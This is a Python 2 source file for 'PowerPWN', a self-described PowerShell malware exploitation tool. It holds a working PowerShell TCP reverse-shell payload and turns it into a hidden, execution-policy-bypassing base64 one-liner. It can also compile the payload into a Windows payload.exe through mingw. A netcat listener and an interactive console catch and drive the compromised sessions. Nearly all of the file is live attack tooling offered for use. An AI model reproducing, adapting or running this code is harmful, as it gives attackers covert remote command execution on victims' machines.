#!/usr/bin/python2
#-*- coding:utf-8 -*-

import socket
import subprocess
import platform
import sys
import time
import os
import readline
import logging
import shlex
import threading
from base64 import b64encode

try:
    import nclib
except ImportError:
    print('\033[1;91m[!] Error NCLIB Not Found !')

try:
    import requests
except ImportError:
    print('\033[1;91m[!] Error Requests Not Found !')

try:
    from datetime import datetime
except ImportError:
    print('\033[1;91m[!] Error Datetime !')

try:
    import colorama
except ImportError:
    print('\033[31m[!] Colorama Not Found !')


banner1 = '''
\033[1;96m
  _____   _____  _  _  _ _______  ______  _____  _  _  _ __   _
 |_____] |     | |  |  | |______ |_____/ |_____] |  |  | | \  |
 |       |_____| |__|__| |______ |    \_ |       |__|__| |  \_|
                                                               
                    
                Created By Unamed
                PowerShell Malware Exploitation Tools
            [     Instagram : \033[31m0x4eff\033[1;96m                    ]
            [     Github : \033[31mhttps://github.com/Unam3dd\033[1;96m   ]

\033[00m
'''

payload_powershell_reverse_shell = """
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.71",1000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
"""


class SimpleCompleter(object):

    def __init__(self, options):
        self.options = sorted(options)
        return

    def complete(self, text, state):
        response = None
        if state == 0:
            # This is the first time for this text, so build a match list.
            if text:
                self.matches = [s
                                for s in self.options
                                if s and s.startswith(text)]
                logging.debug('%s matches: %s', repr(text), self.matches)
            else:
                self.matches = self.options[:]
                logging.debug('(empty input) matches: %s', self.matches)

        # Return the state'th item from the match list,
        # if we have that many.
        try:
            response = self.matches[state]
        except IndexError:
            response = None
        logging.debug('complete(%s, %s) => %s',repr(text), state, repr(response))
        return response


def clear_os():
    if 'Linux' not in platform.platform():
        os.system('cls')
    
    elif 'Windows' not in platform.platform():
        os.system('clear')


global id_conn
conn = []
id_conn = []
global fd_list
fd_list = []
global nc

def listen_connection(host,port):
    i = 0
    print('\033[1;96m[\033[31m+\033[1;96m] Listening On %s:%s\033[00m' % (host,port))
    while True:
        nc = nclib.Netcat(listen=(host, int(port)))
        id_conn.append(nc)
        conn.append(nc.peer)
        print('\033[32m[\033[34m+\033[32m] New Connections from -> \033[96m%s\033[00m' % (nc.peer[0]))
        i = i+1


def interact_session(conn_obj):
    conn_obj.send('\n')
    conn_obj.interact()


def interact_exit(conn_obj):
    conn_obj.send('exit\n')


def generate_payload_reverse_shell_one_liner(host,port):
    f=open('temp_payload.txt','w')
    f.write(payload_powershell_reverse_shell)
    f.close()
    print('\033[32m[\033[34m+\033[32m] Writing Payloads Wait Moment Please...')
    f=open('temp_payload.txt','r')
    content = f.read()
    f.close()
    lhost = content.replace('192.168.1.71',host)
    f=open('temp_payload.txt','w')
    f.write(lhost)
    f.close()
    f=open('temp_payload.txt','r')
    content = f.read()
    f.close()
    lport = content.replace('1000',port)
    f=open('temp_payload.txt','w')
    f.write(lport)
    f.close()
    f=open('temp_payload.txt','r')
    content = f.read()
    f.close()
    payload = b64encode(content.encode('UTF-16LE')) #encoding string with UTF-16LE for base64 encode powershell
    payload_final = "powershell.exe -WindowStyle hidden -exec bypass -EncodedCommand %s" % (payload)
    print('\033[32m[\033[34m+\033[32m] Payload Generate !')
    print('\033[31m%s' % (payload_final))
    print('\n')
    os.system('rm temp_payload.txt')


def generate_payload_reverse_shell(lhost,lport):
    f=open('temp_payload.txt','w')
    f.write(payload_powershell_reverse_shell)
    f.close()
    print('\033[32m[\033[34m+\033[32m] Writing Payloads Wait Moment Please...')
    f=open('temp_payload.txt','r')
    content = f.read()
    f.close()
    lhost = content.replace('192.168.1.71',lhost)
    f=open('temp_payload.txt','w')
    f.write(lhost)
    f.close()
    f=open('temp_payload.txt','r')
    content = f.read()
    f.close()
    lport = content.replace('1000',lport)
    f=open('temp_payload.txt','w')
    f.write(lport)
    f.close()
    f=open('temp_payload.txt','r')
    content = f.read()
    f.close()
    payload = b64encode(content.encode('UTF-16LE')) #encoding string with UTF-16LE for base64 encode powershell
    payload_final = "powershell.exe -WindowStyle hidden -exec bypass -EncodedCommand %s" % (payload)
    print('\033[32m[\033[34m+\033[32m] Payload Generate !')
    os.system('rm temp_payload.txt')
    print('\033[32m[\033[34m+\033[32m] Generate C Template...')
    f=open('tem_c.c',"w")
    f.write("#include <stdio.h>")
    f.write("#include <windows.h>")
    f.write("\n")
    f.write("int main()\n")
    f.write("{\n")
    f.write('   system("%s")\n' % (payload_final))
    f.write('}')
    f.close()
    path_mingw = "/usr/bin/i686-w64-mingw32-gcc"
    check_mingw = os.path.exists(path_mingw)
    if check_mingw ==True:
        print('\033[32m(+) %s Found !\033[00m ' % (path_mingw))
        os.system('i686-w64-mingw32-gcc tem_c.c -o payload.exe && rm temp_c.c && rm temp_payload.txt')
        print('\033[32m(+) Payload Generated save as : payload.exe')
    else:
        print('\033[31m(!) %s Not Found !\033[00m ' % (path_mingw))
        os.system('apt update && apt install mingw-w64')
        os.system('i686-w64-mingw32-gcc tem_c.c -o payload.exe && rm temp_c.c && rm temp_payload.txt')
        print('\033[32m(+) Payload Generated save as : payload.exe')

def console():
    clear_os()
    clear_os()
    print(banner1)
    try:
        readline.set_completer(SimpleCompleter(['help', 'payload','show','modules','reverse_shell_one_liner','reverse_shell','exit','quit','listen','generate','sessions','interact']).complete)
        readline.parse_and_bind('tab: complete')
        while True:
            try:
                t = datetime.now().strftime('%H:%M:%S')
                input_console = raw_input('\033[1;96m[\033[31m%s\033[1;96m] Power\033[1;94m@\033[1;96mPWN\033[31m~\033[1;96m:$ \033[00m' % (t))

                if input_console =="exit" or input_console =="quit":
                    for connection in id_conn:
                        interact_exit(connection)
                    sys.exit("\033[31m[!] Thanks For Using PowerPWN\033[00m")
                
                elif input_console =="clear" or input_console =="cls":
                    clear_os()
                
                elif input_console =="?" or input_console =="help":
                    print('[*****************Main******************************]')
                    print('    command                            Descriptions     ')
                    print('    listen <host> <port>               Listen Host:port ')
                    print('    sessions                           List Sessions Recv')
                    print('    interact                           Interact With Session Number')
                    print('    generate <payload> <host> <port>   Generate Payload')
                    print('[***************************************************]')
                
                elif input_console.startswith('listen')==True:
                    split_ic = shlex.split(input_console)
                    if len(split_ic) ==3:
                        host = split_ic[1]
                        port = split_ic[2]
                        t = threading.Thread(target=listen_connection,args=(host,port))
                        t.start()
                    else:
                        print('\033[31m(+) usage : listen <host> <port>')
                
                elif input_console =="sessions":
                    i = 0
                    for id_c in id_conn:
                        for connection in conn:
                            print("\033[96m[\033[31m%s\033[1;96m]\033[00m Target : \033[31m%s\033[00m  | Port : \033[31m%s\033[00m" % (i,connection[0],connection[1]))
                            i = i+1
                
                elif input_console.startswith('generate')==True:
                    split_generate = shlex.split(input_console)
                    if len(split_generate) ==4:
                        payload = split_generate[1]
                        lhost = split_generate[2]
                        lport = split_generate[3]
                        if payload =="reverse_shell_one_liner":
                            generate_payload_reverse_shell_one_liner(lhost,lport)
                        elif payload =="reverse_shell":
                            generate_payload_reverse_shell(lhost,lport)
                        else:
                            print('\033[31m[!] Payload Not Found !')
                    else:
                        print('\033[31m(+) usage : generate <payload> <lhost> <lport>')               

                elif input_console.startswith("interact")==True:
                    split_send = shlex.split(input_console)
                    if len(split_send) ==2:
                        con_nc = int(split_send[1])
                        try:
                            interact_session(id_conn[con_nc])
                        except KeyboardInterrupt:
                            print('\033[31m[!] Error CTRL+C !')
                        
                        close_session = raw_input('\033[32m[\033[34m+\033[32m] Do You Want Close Session or Keep (y/n) >> ')
                        if close_session =="y":
                            del id_conn[con_nc]
                        else:
                            pass
                    else:
                        print('\033[31m(+) usage : interact <session_number>')
                
                else:
                    print('\033[31m(!) Error Command Not Found !')

            except KeyboardInterrupt:
                print('\033[31m[!] Error : CTRL+C\033[00m')
    
    except Exception as error_console:
        print(error_console.message)

if __name__ == '__main__':
    if sys.version[0] == "3":
        sys.exit('\033[1;91m[!] Python2 Required For This Script !')
    
    try:
        console()
    except Exception as error_start_console:
        print(error_start_console.message)